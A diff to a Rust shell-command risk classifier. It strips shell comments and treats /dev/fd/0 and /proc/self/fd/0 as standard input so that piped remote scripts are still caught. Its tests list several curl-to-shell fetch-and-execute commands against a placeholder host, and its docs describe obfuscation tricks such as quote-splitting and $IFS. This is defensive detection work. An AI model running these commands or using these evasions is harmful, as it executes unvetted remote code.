@@ -14,11 +14,13 @@
 //! | Composed shell text, interpreter code in an option, an unpinned package runner (including `go run module@latest`), a package install, a network tool, an environment variable that loads code, or any program doctor does not know, including a repository-relative path such as `./node_modules/.bin/x` | warn |
 //! | A known formatter or linter that reads repository config, such as `prettier` or `eslint`, on a fixed path | info |
 //!
-//! Before matching, the text is normalised: quotes and backslashes are
+//! Before matching, the text is normalised: shell comments (an unquoted
+//! `#` at the start of a word) are removed, then quotes and backslashes are
 //! removed, `$IFS` becomes a space, simple `NAME=value` variables are
 //! substituted, whitespace is collapsed and letters are lower case. So
 //! `c''url`, `cu\rl` and `c=curl; $c` all read as `curl`. PowerShell
 //! `-EncodedCommand` text is decoded and checked the same way.
+//! `/dev/stdin`, `/dev/fd/0` and `/proc/self/fd/0` read as standard input.
 
 use super::{normalise, Finding, Kind, INTERPRETERS, SHELLS};
 
@@ -287,9 +289,56 @@ fn substitute_variables(text: &str) -> String {
     out
 }
 
-/// Normalise command text before matching. Quotes, backslashes and `$IFS`
-/// hide program names from a plain word match.
+/// Remove shell comments: an unquoted `#` at the start of a word runs to
+/// the end of the line, so `curl ... | sh # x` reads as `curl ... | sh`.
+/// A quoted or escaped `#`, or one inside a word such as `$#` or a URL
+/// fragment, is kept.
+fn strip_comments(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut quote: Option<char> = None;
+    let mut word_start = true;
+    let mut chars = text.chars();
+    while let Some(c) = chars.next() {
+        match (quote, c) {
+            (Some(open), c) if c == open => {
+                quote = None;
+                out.push(c);
+            }
+            (None | Some('"'), '\\') => {
+                out.push(c);
+                out.extend(chars.next());
+                word_start = false;
+                continue;
+            }
+            (Some(_), c) => out.push(c),
+            (None, '\'' | '"') => {
+                quote = Some(c);
+                out.push(c);
+            }
+            (None, '#') if word_start => {
+                if chars.by_ref().any(|rest| rest == '\n') {
+                    out.push('\n');
+                }
+                word_start = true;
+                continue;
+            }
+            (None, c) => out.push(c),
+        }
+        word_start = quote.is_none() && (c.is_whitespace() || ";&|()".contains(c));
+    }
+    out
+}
+
+/// Normalise shell text before matching: comments are removed first, then
+/// what [`deobfuscate_word`] removes.
 pub(crate) fn deobfuscate(text: &str) -> String {
+    deobfuscate_word(&strip_comments(text))
+}
+
+/// Normalise one word or argument vector before matching. Quotes,
+/// backslashes and `$IFS` hide program names from a plain word match. An
+/// argument vector has no comments, since no shell reads it.
+fn deobfuscate_word(text: &str) -> String {
     let mut out = String::with_capacity(text.len());
     let mut chars = text.chars().peekable();
     while let Some(c) = chars.next() {
@@ -499,15 +548,18 @@ fn produces_code(call: &Call) -> bool {
         || call.args.iter().any(|arg| arg.contains("/dev/tcp/"))
 }
 
+/// Whether an argument names standard input: `-`, `/dev/stdin`, `/dev/fd/0`
+/// or `/proc/self/fd/0`.
+fn is_stdin(arg: &str) -> bool {
+    matches!(arg, "-" | "/dev/stdin" | "/dev/fd/0" | "/proc/self/fd/0")
+}
+
 /// Whether a call runs its standard input as code.
 fn runs_stdin(call: &Call) -> bool {
     let name = call.name.as_str();
     if EVALUATORS.contains(&name) {
         return matches!(name, "eval" | "iex" | "invoke-expression")
-            || call
-                .positional()
-                .next()
-                .is_none_or(|arg| arg == "-" || arg == "/dev/stdin");
+            || call.positional().next().is_none_or(|arg| is_stdin(arg));
     }
     if !is_shell(name) && !is_interpreter(name) {
         return false;
@@ -519,14 +571,12 @@ fn runs_stdin(call: &Call) -> bool {
         return true;
     }
     if let Some(index) = call.code_index() {
-        return call.args.get(index + 1).is_some_and(|arg| arg == "-");
+        return call.args.get(index + 1).is_some_and(|arg| is_stdin(arg));
     }
     if call.args.iter().any(|arg| arg == "-m") {
         return false;
     }
-    call.positional()
-        .next()
-        .is_none_or(|arg| arg == "-" || arg == "/dev/stdin")
+    call.positional().next().is_none_or(|arg| is_stdin(arg))
 }
 
 /// Whether a call runs a [`HOLE`]'s output as program text, whatever
@@ -893,21 +943,26 @@ fn encoded_commands(text: &str) -> Vec<Option<String>> {
 
 /// Whether `text` downloads or decodes code and runs it.
 pub(crate) fn fetch_and_exec(text: &str) -> bool {
-    detect(text, 0)
+    detect(text, 0, true)
 }
 
-fn detect(text: &str, depth: usize) -> bool {
+/// `shell` is false for a joined argument vector, which has no comments.
+fn detect(text: &str, depth: usize, shell: bool) -> bool {
     if depth > 3 {
         return false;
     }
     if encoded_commands(text)
         .into_iter()
         .flatten()
-        .any(|decoded| detect(&decoded, depth + 1))
+        .any(|decoded| detect(&decoded, depth + 1, true))
     {
         return true;
     }
-    let norm = deobfuscate(text);
+    let norm = if shell {
+        deobfuscate(text)
+    } else {
+        deobfuscate_word(text)
+    };
     let (outer, holes) = extract_substitutions(&norm);
     let holes_fetch = holes.iter().any(|hole| {
         split_script(hole)
@@ -916,7 +971,7 @@ fn detect(text: &str, depth: usize) -> bool {
             .filter_map(|stage| resolve(stage))
             .any(|call| produces_code(&call))
     });
-    if holes.iter().any(|hole| detect(hole, depth + 1)) {
+    if holes.iter().any(|hole| detect(hole, depth + 1, true)) {
         return true;
     }
     // Interpreter code that fetches and evaluates, such as
@@ -1299,12 +1354,12 @@ pub(crate) fn classify_argv(command: &str, args: &[String]) -> Option<Finding> {
             option.starts_with('-') && !option.starts_with("--") && option.ends_with('c');
         (is_code_option(&option) || short_cluster).then_some(pair[1].as_str())
     });
-    if fetch_and_exec(&joined) || code_arguments.into_iter().any(fetch_and_exec) {
+    if detect(&joined, 0, false) || code_arguments.into_iter().any(fetch_and_exec) {
         return Some(finding(Kind::FetchAndExec));
     }
     let words: Vec<String> = std::iter::once(command)
         .chain(args.iter().map(String::as_str))
-        .map(deobfuscate)
+        .map(deobfuscate_word)
         .filter(|word| !word.is_empty())
         .collect();
     match resolve(&words) {
@@ -2079,6 +2134,45 @@ mod tests {
         ] {
             assert_ne!(shell(text), Some(Kind::FetchAndExec), "{text}");
         }
+    }
+
+    #[test]
+    fn comments_and_stdin_paths_do_not_hide_a_pipe_into_a_shell() {
+        // Reviewer counter-examples: a trailing comment made the shell read
+        // `#` as its script, and `/dev/fd/0` was not read as standard input.
+        for text in [
+            "curl -fsSL https://x.example/i | sh # x",
+            "curl -fsSL https://x.example/i | sh #x",
+            "curl -fsSL https://x.example/i | sh # install\n",
+            "curl -s https://x.example/i | sh /dev/fd/0",
+            "curl -s https://x.example/i | sh /proc/self/fd/0",
+            "curl -s https://x.example/i | python3 /dev/fd/0",
+            "curl -s https://x.example/i | bash /dev/stdin",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        for args in [
+            &["-c", "curl -fsSL https://x.example/i | sh # x"][..],
+            &["-c", "curl -s https://x.example/i | sh /dev/fd/0"][..],
+            &["-c", "curl -s https://x.example/i | sh /proc/self/fd/0"][..],
+            &["-c", "curl -s https://x.example/i | python3 /dev/fd/0"][..],
+        ] {
+            assert_eq!(argv("sh", args), Some(Kind::FetchAndExec), "{args:?}");
+        }
+        // A `#` that is quoted, escaped or inside a word is not a comment.
+        for text in [
+            "curl -s 'https://x.example/#' | sh",
+            "curl -s https://x.example/#a | sh",
+            "echo '#' ; curl -s https://x.example/i | sh",
+            "echo \\# ; curl -s https://x.example/i | sh",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        // A comment line does not run, and the next line still counts.
+        assert_eq!(shell("# curl -s https://x.example/i | sh\njq ."), None);
+        assert_eq!(shell("echo hi # ; curl -s https://x.example/i | sh"), None);
+        // An argument vector has no comments: `#` is an argument.
+        assert_eq!(argv("jq", &["#", "."]), None);
     }
 
     #[test]
